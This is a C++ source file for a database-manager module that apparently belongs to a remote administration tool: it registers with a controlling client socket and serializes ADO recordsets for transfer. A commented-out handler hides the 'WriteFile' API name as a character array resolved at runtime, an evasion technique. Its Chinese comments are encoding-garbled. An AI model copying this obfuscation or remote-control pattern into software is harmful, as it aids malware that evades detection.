
#include "../Declare.h"   //��̬���ÿ⺯��
#include "DBManager.h"


CDBManager::CDBManager(CClientSocket *pClient) :CManager(pClient)
{
	BYTE	bToken = TOKEN_DATABASE;
	Send((LPBYTE)&bToken, 1);
}


CDBManager::~CDBManager()
{
	MessageBox(NULL, "��������", "1", 0);
	return;
}

void CDBManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	/*
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	unsigned long	ByteWrite;
	char HvnXs02[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0' };
	WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"), HvnXs02);
	pWriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
	*/
	MessageBox(NULL, "db", "1", 0);
}

HRESULT CDBManager::SaveRS(_RecordsetPtr pRS/*IN*/, IStream* * ppStream/*OUT*/)
{
	HRESULT hr = S_OK;
	try
	{
		*ppStream = NULL;

		// QI and return IPersistStream
		IPersistStreamPtr pIPersist(pRS);
		if (pIPersist)
		{
			//Create a standard stream in memory
			if (FAILED(hr = CreateStreamOnHGlobal(0, TRUE, (IStream **)ppStream)))
				return hr;

			// Persist the pRS
			if (FAILED(hr = OleSaveToStream(pIPersist, *ppStream)))
				return hr;

		}
		else
			return E_NOINTERFACE;
	}
	catch (_com_error & e)
	{
		return e.Error();
	}
	return S_OK;

}

HRESULT CDBManager::LoadRS(_Recordset* *ppRS/*OUT*/, IStreamPtr pStream/*IN*/)
{
	HRESULT hr = S_OK;
	try
	{
		*ppRS = NULL;
		if (NULL == pStream)
			return E_NOINTERFACE;
		// Load the pRS.
		LARGE_INTEGER li;
		li.QuadPart = 0;

		//Set the pointer to the beginning of the stream
		if (FAILED(hr = pStream->Seek(li, STREAM_SEEK_SET, 0)))
			return hr;

		if (FAILED(hr = OleLoadFromStream(pStream,
			__uuidof(_Recordset),
			reinterpret_cast<LPVOID *>(ppRS)))
			)
			return hr;
	}
	catch (_com_error & e)
	{
		return e.Error();
	}
	return S_OK;
}



/*
void CMssqltestDlg::OnButton1()
{
	// TODO: Add your control notification handler code here
	int i;
	_ConnectionPtr   m_pConnection;
	_CommandPtr m_pCommand;
	_RecordsetPtr m_pRecordset;

	IStreamPtr pStream;

	LONG lStyle;
	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);//��ȡ��ǰ����style
	lStyle &= ~LVS_TYPEMASK; //�����ʾ��ʽλ
	lStyle |= LVS_REPORT; //����style
	SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);//����style
	DWORD dwStyle = m_list.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//ѡ��ĳ��ʹ���и�����ֻ������report����listctrl��
	dwStyle |= LVS_EX_GRIDLINES;//�����ߣ�ֻ������report����listctrl��
	dwStyle |= LVS_EX_CHECKBOXES;//itemǰ����checkbox�ؼ�
	m_list.SetExtendedStyle(dwStyle); //������չ��� 

	//  �������ݿ⣺  
	HRESULT  hr; //���ؽ������
	try
	{
		hr = m_pConnection.CreateInstance("ADODB.Connection"); //����Connection����
		if (SUCCEEDED(hr))
		{
			//hr=m_pConnection->Open("Provider=SQLOLEDB;Server=808644DA83B446C/SQLEXPRESS;Database=ChinabaseSQLServer;UserID=sa;pwd=123","","",adModeUnknown);   //;Integrated Security=SSPI
			CString strCon;
			tboxCon.GetWindowTextA(strCon);
			m_pConnection->Open(_bstr_t(strCon), "", "", adModeUnknown);
			//MessageBox("����SQL���гɹ�!","�ɹ�",MB_OK);
			this->SetWindowTextA("����SQL���гɹ�!");


			m_pCommand.CreateInstance("ADODB.Command");

			CString strSQL;
			tboxSQL.GetWindowTextA(strSQL);

			_variant_t vNULL;
			vNULL.vt = VT_ERROR;
			vNULL.scode = DISP_E_PARAMNOTFOUND;///����Ϊ�޲���
			m_pCommand->ActiveConnection = m_pConnection;///�ǳ��ؼ���һ�䣬�����������Ӹ�ֵ����
			m_pCommand->CommandText = _bstr_t(strSQL); //"SELECT * FROM p_pf_task";///�����ִ�
			m_pRecordset = m_pCommand->Execute(&vNULL, &vNULL, adCmdText);///ִ�����ȡ�ü�¼��

			m_list.DeleteAllItems();								//ɾ��������
			while (m_list.DeleteColumn(0));						//ɾ��������
			for (i = 0; i < m_pRecordset->GetFields()->GetCount(); i++)
			{
				BSTR bs;
				m_pRecordset->GetFields()->GetItem((long)i)->get_Name(&bs);
				CString cs = bs;
				m_list.InsertColumn(0, cs, LVCFMT_LEFT, 100);
			}

			SaveRS(m_pRecordset, (IStream**)&pStream);

			m_pRecordset->MoveFirst();
			while (!m_pRecordset->rsEOF)
			{
				//�²��������������						  
				int nIndex = m_list.GetItemCount();
				LV_ITEM lvItem;
				lvItem.mask = LVIF_TEXT;
				lvItem.iItem = nIndex;     //����
				lvItem.iSubItem = 0;
				lvItem.pszText = "";//(char*)(LPCTSTR)var;   //��һ��
				//�����һ�в����¼ֵ.
				m_list.InsertItem(&lvItem);

				// printf(m_pRecordset->GetCollect(("myage")));
				for (int i = 0; i < m_pRecordset->GetFields()->GetCount(); i++)
				{
					_variant_t  var;
					//VARIANT var;
					m_pRecordset->GetFields()->GetItem((long)i)->get_Value(&var);
					if (var.vt != VT_NULL)
					{
						//printf((LPCTSTR)_bstr_t(var));
						//AfxMessageBox((LPCTSTR)_bstr_t(var));
						CString val = (LPCTSTR)_bstr_t(var);


						//����������
						m_list.SetItemText(nIndex, i, val);

					}
				}

				m_pRecordset->MoveNext();
			}
		}
	}
	catch (_com_error   e)
	{
		CString   errorMsg;
		errorMsg.Format("�������ݿ�ʧ��!\r\n������Ϣ:%s", e.ErrorMessage());
		MessageBox(errorMsg, "����", MB_OK);
	}
}
*/